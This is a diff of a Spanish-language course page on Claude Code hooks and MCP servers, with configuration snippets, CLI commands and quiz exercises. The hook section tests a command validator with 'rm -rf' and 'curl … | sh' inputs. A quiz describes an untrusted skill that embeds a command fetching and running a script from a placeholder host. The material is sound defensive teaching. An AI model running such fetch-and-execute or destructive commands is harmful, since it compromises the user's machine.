+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>        <span class="dt">"matcher"</span><span class="fu">:</span> <span class="st">"Bash|PowerShell"</span><span class="fu">,</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>        <span class="dt">"hooks"</span><span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>          <span class="fu">{</span> <span class="dt">"type"</span><span class="fu">:</span> <span class="st">"command"</span><span class="fu">,</span> <span class="dt">"command"</span><span class="fu">:</span> <span class="st">"</span><span class="ch">\"</span><span class="st">$CLAUDE_PROJECT_DIR</span><span class="ch">\"</span><span class="st">/.claude/hooks/validar-comando.sh"</span><span class="fu">,</span> <span class="dt">"onFailure"</span><span class="fu">:</span> <span class="st">"block"</span> <span class="fu">}</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>        <span class="ot">]</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>      <span class="fu">}</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>    <span class="ot">]</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Resultado comprobado</strong> (25-11-2026, sin Claude, enviando al script JSON con la forma de este evento): <code>rm -rf build</code> → <strong>2</strong> con el mensaje; <code>git log --oneline -5</code> → 0; <code>curl … | sh</code> → <strong>2</strong>. <strong>No comprobado dentro de Claude Code:</strong> el binario de la revisión es la 2.1.330 y, según la documentación, antes de la 2.1.332 las órdenes inyectadas se ejecutan sin llamar a este hook (en la 2.1.331, además, el evento desconocido provoca un aviso al arrancar). Para comprobarlo en tu versión, crea una skill de prueba cuyo <code>SKILL.md</code> contenga <code>!`echo rm -rf x`</code> (una orden inofensiva que el patrón detecta), invócala y comprueba que Claude Code informa de que la orden no se ejecutó. Si tu plugin o tu proyecto dependen de este evento, exige la versión mínima (C7.8).</p>
+<div class="callout callout-style-default callout-warning callout-titled" title="Riesgos de los hooks">
 <div class="callout-header d-flex align-content-center">
 <div class="callout-icon-container">
 <i class="callout-icon"></i>
@@ -776,15 +790,17 @@ div.csl-indent {
 <div class="callout-body-container callout-body">
 <ul>
 <li><strong>Se ejecutan con tus permisos</strong> y sin pedirte confirmación: un hook de un repositorio ajeno puede hacer lo que tú puedes hacer. <strong>Lee los hooks de <code>.claude/settings.json</code> de cualquier proyecto antes de aceptar su confianza.</strong></li>
-<li><strong>Un hook que falla suele no bloquear</strong>: si tu script se rompe (código distinto de 0 y 2), la acción sigue. Pruébalo.</li>
-<li><strong>No metas lógica lenta</strong>: se ejecuta en cada evento que coincide.</li>
+<li><strong>Un hook que falla suele no bloquear</strong>: si tu script se rompe (código distinto de 0 y 2), la acción sigue, salvo con <code>onFailure: "block"</code>. Pruébalo.</li>
+<li><strong>No metas lógica lenta</strong>: se ejecuta en cada evento que coincide. Además de los de tipo <code>command</code>, hay hooks de tipo <em>prompt</em> y <em>agent</em>, que piden a un modelo que evalúe la situación: son lentos y gastan. Los hooks que coinciden se ejecutan en paralelo y los de esos dos tipos tienen un tope de simultaneidad, sobre el que <strong>las fuentes discrepan</strong>: el registro de cambios de la 2.1.312 habla de 24 a la vez por sesión, subagentes incluidos; la referencia de hooks vigente (25-11-2026) dice que, si hay más de 12, se ejecutan 12 a la vez y el resto espera, y que el <code>timeout</code> de cada uno empieza a contar cuando arranca <span class="citation" data-cites="anthropic-changelog anthropic-hooks">(<a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>; <a href="#ref-anthropic-hooks" role="doc-biblioref"><em>Automate actions with hooks</em> 2026</a>)</span>. Ninguna de las dos cifras se ha comprobado; lo prudente es no depender de muchos a la vez.</li>
 <li><strong>No fíes la seguridad a patrones de texto</strong>: <code>rm  -rf</code> (dos espacios) o una orden construida en una variable los esquivan. Los hooks refuerzan los permisos y el sandbox; no los sustituyen.</li>
 <li><strong>Escapa bien el JSON</strong> que devuelves (usa <code>jq</code>, no concatenes cadenas).</li>
 <li><strong>No hagas que un hook modifique ficheros del proyecto</strong> sin que quede claro (efectos ocultos).</li>
 </ul>
 </div>
 </div>
-<p><strong>Pon a prueba lo anterior.</strong></p>
+<div class="no-row-height column-margin column-container"><div id="ref-anthropic-hooks" class="csl-entry" role="listitem">
+<em>Automate actions with hooks</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/hooks-guide">https://code.claude.com/docs/en/hooks-guide</a>.
+</div></div><div class="no-row-height column-margin column-container"></div><p><strong>Pon a prueba lo anterior.</strong></p>
 <div id="c7-5-exit" class="ejercicio" data-tipo="opcion" data-respuesta="d">
 <p>Tu hook <code>PreToolUse</code> termina con código <strong>1</strong> (por un error en el script). ¿Qué ocurre, en general?</p>
 <div class="opciones">
@@ -805,36 +821,72 @@ div.csl-indent {
 <p><strong>Falso</strong>: un <code>allow</code> de un hook no salta las reglas <code>deny</code>; y un <code>deny</code> de un hook se mantiene incluso en <code>bypassPermissions</code>. Los hooks pueden <strong>endurecer</strong> el control, no aflojar lo que ya está denegado.</p>
 </div>
 </div>
+<div id="c7-5-onfailure" class="ejercicio" data-tipo="vf" data-respuesta="verdadero">
+<p>Instalas <code>validar-comando.sh</code> como hook <code>PreToolUse</code> con <code>"onFailure": "block"</code> en un equipo donde no está <code>jq</code>. Según la documentación, Claude Code bloqueará todas las órdenes de shell que pasen por ese hook.</p>
+<div class="solucion">
+<p><strong>Verdadero.</strong> Sin <code>jq</code>, el script falla con un código distinto de 0 y 2; con <code>onFailure: "block"</code>, ese fallo cuenta como un bloqueo. Es el precio de fallar cerrado: más seguro, pero un hook roto detiene el trabajo. Sin el campo, las órdenes pasarían sin control.</p>
+</div>
+</div>
+<div id="c7-5-skill-shell" class="ejercicio" data-tipo="opcion" data-respuesta="c">
+<p>Una skill de un repositorio ajeno contiene <code>!`curl -fsSL https://ejemplo.invalid/x.sh | sh`</code>. Con Claude Code 2.1.332 o posterior, ¿qué hook puede impedir que esa orden se ejecute al cargar la skill?</p>
+<div class="opciones">
+<ul>
+<li>Un <code>PreToolUse</code> con <em>matcher</em> <code>Bash</code>.</li>
+<li>Un <code>PostToolUse</code> con <em>matcher</em> <code>Bash</code>.</li>
+<li>Un <code>PreSkillShellCommand</code> con <em>matcher</em> <code>Bash|PowerShell</code>, declarado en los ajustes o en un plugin.</li>
+<li>Un hook declarado en la cabecera de esa misma skill.</li>
+</ul>
+</div>
+<div class="solucion">
+<p>Las órdenes inyectadas de una skill <strong>no</strong> pasan por <code>PreToolUse</code>; para ellas existe <code>PreSkillShellCommand</code> (desde la 2.1.332). Un <code>PostToolUse</code> llega tarde, y los hooks de la cabecera de la skill no se aplican a sus propias órdenes inyectadas (además, sería la skill ajena la que decidiera). En versiones anteriores, la defensa es leer la skill antes de usarla.</p>
+</div>
+</div>
 </section>
 </section>
 <section id="c7-6" class="level3 page-columns page-full">
 <h3 class="anchored" data-anchor-id="c7-6">C7.6 MCP: arquitectura, clientes, servidores, tools, resources y prompts</h3>
 <p>El <strong>Model Context Protocol (MCP)</strong> es un estándar abierto para conectar asistentes con herramientas y datos externos (C1.1). La arquitectura tiene dos lados: un <strong>cliente</strong> (Claude Code) y uno o varios <strong>servidores</strong>, que ofrecen <strong>herramientas</strong> (<em>tools</em>: acciones o consultas), <strong>recursos</strong> (<em>resources</em>: datos que se pueden leer) y <strong>prompts</strong> plantillas de petición. Claude decide cuándo llamar a una herramienta; <strong>el servidor hace el trabajo</strong> <span class="citation" data-cites="anthropic-mcp">(<a href="#ref-anthropic-mcp" role="doc-biblioref"><em>Connect Claude Code to tools via MCP</em> 2026</a>)</span>.</p>
-<div class="no-row-height column-margin column-container"><div id="ref-anthropic-mcp" class="csl-entry" role="listitem">
-<em>Connect Claude Code to tools via MCP</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/mcp">https://code.claude.com/docs/en/mcp</a>.
-</div></div><p><strong>Transportes</strong> (documentación consultada el 23-10-2026): <strong>HTTP</strong> (recomendado para servidores remotos), <strong>stdio</strong> (proceso local en tu máquina) y SSE (<strong>obsoleto</strong>).</p>
+<div class="no-row-height column-margin column-container"></div><p><strong>Transportes</strong> (documentación consultada el 23-10-2026): <strong>HTTP</strong> (recomendado para servidores remotos), <strong>stdio</strong> (proceso local en tu máquina) y SSE (<strong>obsoleto</strong>).</p>
 <p><strong>Añadir un servidor</strong> (sintaxis de la documentación y de <code>claude mcp add --help</code> en la versión 2.1.306; <strong>no se ejecutó</strong> porque modifica <code>~/.claude.json</code>):</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Remoto (HTTP)</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp add <span class="at">--transport</span> http <span class="op">&lt;</span>nombre<span class="op">&gt;</span> <span class="op">&lt;</span>url<span class="op">&gt;</span></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Local (stdio): todo lo que sigue a «--» es la orden del servidor, sin tocar</span></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp add <span class="at">--transport</span> stdio <span class="at">--scope</span> project datos-curso <span class="at">--</span> uv run <span class="at">--with</span> <span class="st">"mcp&gt;=2"</span> python c7-extender/_ejemplo/mcp/servidor_csv.py</span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp list           <span class="co"># servidores configurados</span></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp get <span class="op">&lt;</span>nombre<span class="op">&gt;</span>   <span class="co"># detalles de uno</span></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp remove <span class="op">&lt;</span>nombre<span class="op">&gt;</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Remoto (HTTP)</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp add <span class="at">--transport</span> http <span class="op">&lt;</span>nombre<span class="op">&gt;</span> <span class="op">&lt;</span>url<span class="op">&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Local (stdio): todo lo que sigue a «--» es la orden del servidor, sin tocar</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp add <span class="at">--transport</span> stdio <span class="at">--scope</span> project datos-curso <span class="at">--</span> uv run <span class="at">--with</span> <span class="st">"mcp&gt;=2"</span> python c7-extender/_ejemplo/mcp/servidor_csv.py</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp list           <span class="co"># servidores configurados</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp get <span class="op">&lt;</span>nombre<span class="op">&gt;</span>   <span class="co"># detalles de uno</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp remove <span class="op">&lt;</span>nombre<span class="op">&gt;</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
 <p>Dentro de una sesión, <code>/mcp</code> muestra el estado de cada servidor y gestiona la autenticación. El separador <code>--</code> importa: sin él, Claude Code intentaría interpretar como propias las opciones del servidor.</p>
 <p><strong>Ámbitos</strong> (dónde se guarda): <code>local</code> (por defecto; solo tú, solo este proyecto, en <code>~/.claude.json</code>), <code>project</code> (el equipo, vía Git, en <strong><code>.mcp.json</code></strong> en la raíz) y <code>user</code> (todos tus proyectos). Si un mismo servidor está en varios sitios, se usa la definición de mayor precedencia (local &gt; proyecto &gt; usuario) <strong>entera</strong>, sin combinar campos. Un servidor de proyecto en <code>.mcp.json</code> <strong>pide aprobación</strong> la primera vez en sesiones interactivas.</p>
 <p>Ejemplo de <code>.mcp.json</code> para el servidor local (una entrada sin <code>type</code> se lee como <em>stdio</em>):</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
-<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"mcpServers"</span><span class="fu">:</span> <span class="fu">{</span></span>
-<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">"datos-curso"</span><span class="fu">:</span> <span class="fu">{</span></span>
-<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>      <span class="dt">"command"</span><span class="fu">:</span> <span class="st">"uv"</span><span class="fu">,</span></span>
-<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>      <span class="dt">"args"</span><span class="fu">:</span> <span class="ot">[</span><span class="st">"run"</span><span class="ot">,</span> <span class="st">"--with"</span><span class="ot">,</span> <span class="st">"mcp&gt;=2"</span><span class="ot">,</span> <span class="st">"python"</span><span class="ot">,</span> <span class="st">"c7-extender/_ejemplo/mcp/servidor_csv.py"</span><span class="ot">]</span></span>
-<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
-<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
-<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
-<div class="callout callout-style-default callout-warning callout-titled" title="Seguridad de MCP">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode json code-with-copy"><code class="sourceCode json"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">"mcpServers"</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">"datos-curso"</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>      <span class="dt">"command"</span><span class="fu">:</span> <span class="st">"uv"</span><span class="fu">,</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a>      <span class="dt">"args"</span><span class="fu">:</span> <span class="ot">[</span><span class="st">"run"</span><span class="ot">,</span> <span class="st">"--with"</span><span class="ot">,</span> <span class="st">"mcp&gt;=2"</span><span class="ot">,</span> <span class="st">"python"</span><span class="ot">,</span> <span class="st">"c7-extender/_ejemplo/mcp/servidor_csv.py"</span><span class="ot">]</span></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>  <span class="fu">}</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<p><strong>Añadir un servidor desde su JSON: <code>claude mcp add-json</code>.</strong> Cuando ya tienes la definición de un servidor en JSON (la de la documentación del servidor o la de un <code>.mcp.json</code> de otro proyecto), <code>claude mcp add-json &lt;nombre&gt; '&lt;json&gt;'</code> la registra tal cual, con el mismo <code>--scope</code> que <code>claude mcp add</code>. El problema es escribir ese JSON en la línea de órdenes: las comillas se escapan distinto en Zsh y en PowerShell y un error deja una definición rota. Desde Claude Code 2.1.327, si pones <code>-</code> en lugar del JSON, la orden lo lee de la <strong>entrada estándar</strong> <span class="citation" data-cites="anthropic-mcp anthropic-changelog">(<a href="#ref-anthropic-mcp" role="doc-biblioref"><em>Connect Claude Code to tools via MCP</em> 2026</a>; <a href="#ref-anthropic-changelog" role="doc-biblioref"><em>Changelog</em> 2026</a>)</span>. Guarda en <code>servidor.json</code> lo que va dentro de <code>"datos-curso"</code> en el ejemplo anterior y ejecuta, <strong>fuera</strong> de una sesión de Claude Code:</p>
+<div class="no-row-height column-margin column-container"></div><div class="tabset-margin-container"></div><div class="panel-tabset">
+<ul class="nav nav-tabs" role="tablist"><li class="nav-item" role="presentation"><a class="nav-link active" id="tabset-1-1-tab" data-bs-toggle="tab" data-bs-target="#tabset-1-1" role="tab" aria-controls="tabset-1-1" aria-selected="true" href="">macOS (Zsh)</a></li><li class="nav-item" role="presentation"><a class="nav-link" id="tabset-1-2-tab" data-bs-toggle="tab" data-bs-target="#tabset-1-2" role="tab" aria-controls="tabset-1-2" aria-selected="false" href="">Windows (PowerShell)</a></li></ul>
+<div class="tab-content">
+<div id="tabset-1-1" class="tab-pane active" role="tabpanel" aria-labelledby="tabset-1-1-tab">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode zsh code-with-copy"><code class="sourceCode zsh"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> servidor.json <span class="kw">|</span> <span class="ex">claude</span> mcp add-json <span class="at">--scope</span> local datos-curso <span class="at">-</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">claude</span> mcp get datos-curso      <span class="co"># comprobación: muestra la orden y los argumentos</span></span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+<div id="tabset-1-2" class="tab-pane" role="tabpanel" aria-labelledby="tabset-1-2-tab">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb10"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Get-Content</span> servidor<span class="op">.</span><span class="fu">json</span> <span class="op">-</span>Raw <span class="op">|</span> claude mcp add-json <span class="op">--</span>scope local datos-curso <span class="op">-</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>claude mcp get datos-curso</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+</div>
+</div>
+</div>
+<p>La ayuda de <code>claude mcp add-json --help</code> del binario 2.1.330 ya recoge el <code>-</code> para leer de la entrada estándar; la orden <strong>no se ha ejecutado</strong> por la misma razón que <code>claude mcp add</code> (escribe en <code>~/.claude.json</code>). Si <code>claude mcp get</code> muestra <code>uv</code> y los cinco argumentos, el JSON llegó entero.</p>
+<p><strong>Trabajos largos: tareas MCP.</strong> Algunas herramientas tardan minutos (exportar un informe, lanzar una compilación). Con la extensión de <strong>tareas MCP</strong> (<em>MCP tasks</em>), el servidor acepta el trabajo y lo ejecuta <strong>por su cuenta</strong>: la llamada de Claude vuelve en cuanto el servidor lo acepta y Claude puede seguir con otra cosa. Claude Code consulta periódicamente el estado, muestra en el pie un contador («1 MCP task») y, al terminar, añade una línea en la conversación y entrega el resultado a Claude <span class="citation" data-cites="anthropic-mcp">(<a href="#ref-anthropic-mcp" role="doc-biblioref"><em>Connect Claude Code to tools via MCP</em> 2026</a>)</span>. Cómo se usa: no hay nada que activar; depende de que el <strong>servidor</strong> las ofrezca. Cómo se comprueba: <code>/tasks</code> lista las tareas en curso y permite pararlas (selección y <code>x</code>). Límites documentados: pararla solo <strong>pide</strong> al servidor que cancele (puede terminarla igualmente); no funcionan en ejecuciones <code>claude -p "…"</code> de una sola vez; y con un servidor <em>stdio</em> el proceso termina al cerrar Claude Code, mientras que uno remoto sigue trabajando. Sobre la versión, las fuentes no coinciden: la documentación vigente pide Claude Code 2.1.304 o posterior (y un servidor con la revisión del protocolo de 28-7-2026), mientras que el registro de cambios las recoge en la 2.1.319; usa la 2.1.319 o posterior para no depender de esa diferencia. El servidor del curso (C7.7) responde al instante y <strong>no</strong> usa tareas; no se han probado.</p>
+<div class="no-row-height column-margin column-container"><div id="ref-anthropic-mcp" class="csl-entry" role="listitem">
+<em>Connect Claude Code to tools via MCP</em>. 2026. Documentación de Claude Code (Anthropic), consultada el 23-10-2026. <a href="https://code.claude.com/docs/en/mcp">https://code.claude.com/docs/en/mcp</a>.
+</div></div><div class="callout callout-style-default callout-warning callout-titled" title="Seguridad de MCP">
 <div class="callout-header d-flex align-content-center">
 <div class="callout-icon-container">
 <i class="callout-icon"></i>
@@ -867,32 +919,38 @@ div.csl-indent {
 <p>El ámbito <code>project</code> escribe <code>.mcp.json</code> en la raíz, que se commitea. Cada persona tendrá que <strong>aprobarlo</strong> la primera vez. <code>local</code> y <code>user</code> no se comparten por Git.</p>
 </div>
 </div>
+<div id="c7-6-tareas" class="ejercicio" data-tipo="vf" data-respuesta="falso">
+<p>Si paras una tarea MCP desde <code>/tasks</code>, tienes la garantía de que el servidor no completa el trabajo.</p>
+<div class="solucion">
+<p><strong>Falso.</strong> Parar una tarea solo <strong>pide</strong> al servidor que la cancele; según la documentación, el servidor puede terminarla igualmente. Si el trabajo tiene efectos (enviar, publicar, borrar), compruébalo en el sistema de destino, no en la conversación.</p>
+</div>
+</div>
 </section>
 <section id="c7-7" class="level3">
 <h3 class="anchored" data-anchor-id="c7-7">C7.7 Un servidor MCP local de solo lectura; MCP frente a un script</h3>
 <p><code>_ejemplo/mcp/servidor_csv.py</code> es un servidor <strong>de solo lectura</strong> sobre los datos sintéticos del curso, escrito con el SDK de Python (<code>mcp</code> 2.x, donde <code>FastMCP</code> pasó a llamarse <code>MCPServer</code>):</p>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> mcp.server.mcpserver <span class="im">import</span> MCPServer</span>
-<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>mcp <span class="op">=</span> MCPServer(<span class="st">"datos-sinteticos-curso"</span>)</span>
-<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.tool</span>()</span>
-<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> listar_casos() <span class="op">-&gt;</span> <span class="bu">list</span>[<span class="bu">str</span>]:</span>
-<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">"""Lista los casos disponibles (nombre de fichero sin extensión)."""</span></span>
-<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> _casos()</span>
-<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.tool</span>()</span>
-<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> resumen_csv(caso: <span class="bu">str</span>) <span class="op">-&gt;</span> <span class="bu">dict</span>:</span>
-<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">"""Filas, columnas y ausentes por columna de un caso de datos sintéticos."""</span></span>
-<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> caso <span class="kw">not</span> <span class="kw">in</span> _casos():          <span class="co"># lista blanca: impide rutas como ../../secreto</span></span>
-<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">raise</span> <span class="pp">ValueError</span>(<span class="ss">f"caso desconocido: </span><span class="sc">{</span>caso<span class="sc">!r}</span><span class="ss">"</span>)</span>
-<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>    ...</span>
-<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.resource</span>(<span class="st">"resumen://casos"</span>)</span>
-<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> casos_disponibles() <span class="op">-&gt;</span> <span class="bu">str</span>:</span>
-<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="st">"</span><span class="ch">\n</span><span class="st">"</span>.join(_casos())</span>
-<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">"__main__"</span>:</span>
-<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>    mcp.run(transport<span class="op">=</span><span class="st">"stdio"</span>)</span></code></pre></div><button title="Copiar al portapapeles" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> mcp.server.mcpserver <span class="im">import</span> MCPServer</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>mcp <span class="op">=</span> MCPServer(<span class="st">"datos-sinteticos-curso"</span>)</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.tool</span>()</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> listar_casos() <span class="op">-&gt;</span> <span class="bu">list</span>[<span class="bu">str</span>]:</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">"""Lista los casos disponibles (nombre de fichero sin extensión)."""</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> _casos()</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.tool</span>()</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> resumen_csv(caso: <span class="bu">str</span>) <span class="op">-&gt;</span> <span class="bu">dict</span>:</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">"""Filas, columnas y ausentes por columna de un caso de datos sintéticos."""</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> caso <span class="kw">not</span> <span class="kw">in</span> _casos():          <span class="co"># lista blanca: impide rutas como ../../secreto</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">raise</span> <span class="pp">ValueError</span>(<span class="ss">f"caso desconocido: </span><span class="sc">{</span>caso<span class="sc">!r}</span><span class="ss">"</span>)</span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>    ...</span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a><span class="at">@mcp.resource</span>(<span class="st">"resumen://casos"</span>)</span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> casos_disponibles() <span class="op">-&gt;</span> <span class="bu">str</span>:</span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="st">"</span><span class="ch">\n</span><span class="st">"</span>.join(_casos())</span>
